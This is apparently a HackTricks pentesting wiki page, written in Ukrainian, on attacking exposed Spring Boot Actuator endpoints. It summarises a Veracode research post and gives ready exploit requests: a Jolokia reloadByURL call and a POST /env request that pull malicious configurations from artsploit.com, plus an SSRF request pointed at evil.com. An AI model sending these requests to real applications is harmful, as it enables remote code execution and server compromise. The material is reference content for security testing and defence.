# Spring Actuators

<details>

<summary><strong>–í–∏–≤—á–∞–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS –≤—ñ–¥ –Ω—É–ª—è –¥–æ –≥–µ—Ä–æ—è –∑</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

–Ü–Ω—à—ñ —Å–ø–æ—Å–æ–±–∏ –ø—ñ–¥—Ç—Ä–∏–º–∫–∏ HackTricks:

* –Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ –≤–∞—à—É **–∫–æ–º–ø–∞–Ω—ñ—é –≤ —Ä–µ–∫–ª–∞–º—ñ –Ω–∞ HackTricks** –∞–±–æ **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ HackTricks —É —Ñ–æ—Ä–º–∞—Ç—ñ PDF**, –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ü–õ–ê–ù–ò –ü–Ü–î–ü–ò–°–ö–ò**](https://github.com/sponsors/carlospolop)!
* –û—Ç—Ä–∏–º–∞–π—Ç–µ [**–æ—Ñ—ñ—Ü—ñ–π–Ω–∏–π PEASS & HackTricks –º–µ—Ä—á**](https://peass.creator-spring.com)
* –í—ñ–¥–∫—Ä–∏–π—Ç–µ –¥–ª—è —Å–µ–±–µ [**–°—ñ–º'—é PEASS**](https://opensea.io/collection/the-peass-family), –Ω–∞—à—É –∫–æ–ª–µ–∫—Ü—ñ—é –µ–∫—Å–∫–ª—é–∑–∏–≤–Ω–∏—Ö [**NFT**](https://opensea.io/collection/the-peass-family)
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –Ω–∞ **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **–ü–æ–¥—ñ–ª—ñ—Ç—å—Å—è —Å–≤–æ—ó–º–∏ —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞–π—Ç–µ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤.

</details>

## **Spring Auth Bypass**

<figure><img src="../../.gitbook/assets/image (5) (2).png" alt=""><figcaption></figcaption></figure>

**–ó** [**https://raw.githubusercontent.com/Mike-n1/tips/main/SpringAuthBypass.png**](https://raw.githubusercontent.com/Mike-n1/tips/main/SpringAuthBypass.png)\*\*\*\*

## Exploiting Spring Boot Actuators

**–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ –æ—Ä–∏–≥—ñ–Ω–∞–ª—å–Ω–∏–π –ø–æ—Å—Ç –∑–∞ –∞–¥—Ä–µ—Å–æ—é** [**https://www.veracode.com/blog/research/exploiting-spring-boot-actuators**]

### **–ö–ª—é—á–æ–≤—ñ –º–æ–º–µ–Ω—Ç–∏:**

- –ê–∫—Ç—É–∞—Ç–æ—Ä–∏ Spring Boot —Ä–µ—î—Å—Ç—Ä—É—é—Ç—å –µ–Ω–¥–ø–æ—ñ–Ω—Ç–∏, —Ç–∞–∫—ñ —è–∫ `/health`, `/trace`, `/beans`, `/env` —Ç–æ—â–æ. –£ –≤–µ—Ä—Å—ñ—è—Ö –≤—ñ–¥ 1 –¥–æ 1.4 —Ü—ñ –µ–Ω–¥–ø–æ—ñ–Ω—Ç–∏ –¥–æ—Å—Ç—É–ø–Ω—ñ –±–µ–∑ –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó. –ü–æ—á–∏–Ω–∞—é—á–∏ –∑ –≤–µ—Ä—Å—ñ—ó 1.5, –ª–∏—à–µ `/health` —Ç–∞ `/info` –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º –Ω–µ —î —á—É—Ç–ª–∏–≤–∏–º–∏, –∞–ª–µ —Ä–æ–∑—Ä–æ–±–Ω–∏–∫–∏ —á–∞—Å—Ç–æ –≤–∏–º–∏–∫–∞—é—Ç—å —Ü—é –±–µ–∑–ø–µ–∫—É.
- –î–µ—è–∫—ñ –µ–Ω–¥–ø–æ—ñ–Ω—Ç–∏ Actuator –º–æ–∂—É—Ç—å –≤–∏–∫—Ä–∏–≤–∞—Ç–∏ —á—É—Ç–ª–∏–≤—ñ –¥–∞–Ω—ñ –∞–±–æ –¥–æ–∑–≤–æ–ª—è—Ç–∏ —à–∫—ñ–¥–ª–∏–≤—ñ –¥—ñ—ó:
- `/dump`, `/trace`, `/logfile`, `/shutdown`, `/mappings`, `/env`, `/actuator/env`, `/restart` —Ç–∞ `/heapdump`.
- –£ Spring Boot 1.x –∞–∫—Ç—É–∞—Ç–æ—Ä–∏ —Ä–µ—î—Å—Ç—Ä—É—é—Ç—å—Å—è –ø—ñ–¥ –∫–æ—Ä–µ–Ω–µ–≤–∏–º URL, —Ç–æ–¥—ñ —è–∫ —É 2.x –≤–æ–Ω–∏ —Ä–æ–∑—Ç–∞—à–æ–≤–∞–Ω—ñ –ø—ñ–¥ –±–∞–∑–æ–≤–∏–º —à–ª—è—Ö–æ–º `/actuator/`.

### **–¢–µ—Ö–Ω—ñ–∫–∏ –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó:**

1. **–í—ñ–¥–¥–∞–ª–µ–Ω–µ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –∫–æ–¥—É —á–µ—Ä–µ–∑ '/jolokia'**:
- –ï–Ω–¥–ø–æ—ñ–Ω—Ç –∞–∫—Ç—É–∞—Ç–æ—Ä–∞ `/jolokia` –≤–∏–∫—Ä–∏–≤–∞—î –±—ñ–±–ª—ñ–æ—Ç–µ–∫—É Jolokia, —è–∫–∞ –¥–æ–∑–≤–æ–ª—è—î HTTP-–¥–æ—Å—Ç—É–ø –¥–æ MBeans.
- –î—ñ—è `reloadByURL` –º–æ–∂–µ –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–∞ –¥–ª—è –ø–µ—Ä–µ–∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ–π –ª–æ–≥—É–≤–∞–Ω–Ω—è –∑–æ–≤–Ω—ñ—à–Ω—å–æ–≥–æ URL, —â–æ –º–æ–∂–µ –ø—Ä–∏–∑–≤–µ—Å—Ç–∏ –¥–æ —Å–ª—ñ–ø–æ–≥–æ XXE –∞–±–æ –≤—ñ–¥–¥–∞–ª–µ–Ω–æ–≥–æ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –∫–æ–¥—É —á–µ—Ä–µ–∑ —Å—Ç–≤–æ—Ä–µ–Ω—ñ XML-–∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó.
- –ü—Ä–∏–∫–ª–∞–¥ URL-–µ–∫—Å–ø–ª–æ–π—Ç—É: `http://localhost:8090/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/artsploit.com!/logback.xml`.

2. **–ó–º—ñ–Ω–∞ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó —á–µ—Ä–µ–∑ '/env'**:
- –Ø–∫—â–æ –ø—Ä–∏—Å—É—Ç–Ω—ñ –±—ñ–±–ª—ñ–æ—Ç–µ–∫–∏ Spring Cloud, –µ–Ω–¥–ø–æ—ñ–Ω—Ç `/env` –¥–æ–∑–≤–æ–ª—è—î –∑–º—ñ–Ω—é–≤–∞—Ç–∏ —Å–µ—Ä–µ–¥–æ–≤–∏—â–Ω—ñ –≤–ª–∞—Å—Ç–∏–≤–æ—Å—Ç—ñ.
- –í–ª–∞—Å—Ç–∏–≤–æ—Å—Ç—ñ –º–æ–∂—É—Ç—å –±—É—Ç–∏ –∑–º–∞–Ω—ñ–ø—É–ª—å–æ–≤–∞–Ω—ñ –¥–ª—è –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç–µ–π, —Ç–∞–∫–∏—Ö —è–∫ –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å –¥–µ—Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—ó XStream —É —Å–µ—Ä–≤—ñ—Å—ñ Eureka serviceURL.
- –ü—Ä–∏–∫–ª–∞–¥ POST-–∑–∞–ø–∏—Ç—É –µ–∫—Å–ø–ª–æ–π—Ç—É:

```
POST /env HTTP/1.1
Host: 127.0.0.1:8090
Content-Type: application/x-www-form-urlencoded
Content-Length: 65

eureka.client.serviceUrl.defaultZone=http://artsploit.com/n/xstream
```

3. **–Ü–Ω—à—ñ –∫–æ—Ä–∏—Å–Ω—ñ –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è**:
- –í–ª–∞—Å—Ç–∏–≤–æ—Å—Ç—ñ, —Ç–∞–∫—ñ —è–∫ `spring.datasource.tomcat.validationQuery`, `spring.datasource.tomcat.url` —Ç–∞ `spring.datasource.tomcat.max-active`, –º–æ–∂—É—Ç—å –±—É—Ç–∏ –∑–º–∞–Ω—ñ–ø—É–ª—å–æ–≤–∞–Ω—ñ –¥–ª—è —Ä—ñ–∑–Ω–∏—Ö –µ–∫—Å–ø–ª–æ–π—Ç—ñ–≤, —Ç–∞–∫–∏—Ö —è–∫ SQL-—ñ–Ω'—î–∫—Ü—ñ—è –∞–±–æ –∑–º—ñ–Ω–∞ —Ä—è–¥–∫—ñ–≤ –ø—ñ–¥–∫–ª—é—á–µ–Ω–Ω—è –¥–æ –±–∞–∑–∏ –¥–∞–Ω–∏—Ö.

### **–î–æ–¥–∞—Ç–∫–æ–≤–∞ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è:**

- –ü–æ–≤–Ω–∏–π —Å–ø–∏—Å–æ–∫ –∞–∫—Ç—É–∞—Ç–æ—Ä—ñ–≤ –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º –º–æ–∂–Ω–∞ –∑–Ω–∞–π—Ç–∏ [—Ç—É—Ç](https://github.com/artsploit/SecLists/blob/master/Discovery/Web-Content/spring-boot.txt).
- –ï–Ω–¥–ø–æ—ñ–Ω—Ç `/env` —É Spring Boot 2.x –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î —Ñ–æ—Ä–º–∞—Ç JSON –¥–ª—è –∑–º—ñ–Ω–∏ –≤–ª–∞—Å—Ç–∏–≤–æ—Å—Ç–µ–π, –∞–ª–µ –∑–∞–≥–∞–ª—å–Ω–∞ –∫–æ–Ω—Ü–µ–ø—Ü—ñ—è –∑–∞–ª–∏—à–∞—î—Ç—å—Å—è —Ç–∞–∫–æ—é –∂.

### **–ü–æ–≤'—è–∑–∞–Ω—ñ —Ç–µ–º–∏:**

1. **Env + H2 RCE**:
- –î–µ—Ç–∞–ª—ñ —â–æ–¥–æ –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó –∫–æ–º–±—ñ–Ω–∞—Ü—ñ—ó –µ–Ω–¥–ø–æ—ñ–Ω—Ç—É `/env` —Ç–∞ –±–∞–∑–∏ –¥–∞–Ω–∏—Ö H2 –º–æ–∂–Ω–∞ –∑–Ω–∞–π—Ç–∏ [—Ç—É—Ç](https://spaceraccoon.dev/remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database).

2. **SSRF –Ω–∞ Spring Boot —á–µ—Ä–µ–∑ –Ω–µ–ø—Ä–∞–≤–∏–ª—å–Ω–µ —Ç–ª—É–º–∞—á–µ–Ω–Ω—è —à–ª—è—Ö—É**:
- –û–±—Ä–æ–±–∫–∞ –º–∞—Ç—Ä–∏—á–Ω–∏—Ö –ø–∞—Ä–∞–º–µ—Ç—Ä—ñ–≤ (`;`) —É HTTP-—à–ª—è—Ö–∞—Ö —Ñ—Ä–µ–π–º–≤–æ—Ä–∫–æ–º Spring –º–æ–∂–µ –±—É—Ç–∏ –µ–∫—Å–ø–ª—É–∞—Ç–æ–≤–∞–Ω–∞ –¥–ª—è Server-Side Request Forgery (SSRF).
- –ü—Ä–∏–∫–ª–∞–¥ –∑–∞–ø–∏—Ç—É –µ–∫—Å–ø–ª–æ–π—Ç—É:

```http
GET ;@evil.com/url HTTP/1.1
Host: target.com
Connection: close
```
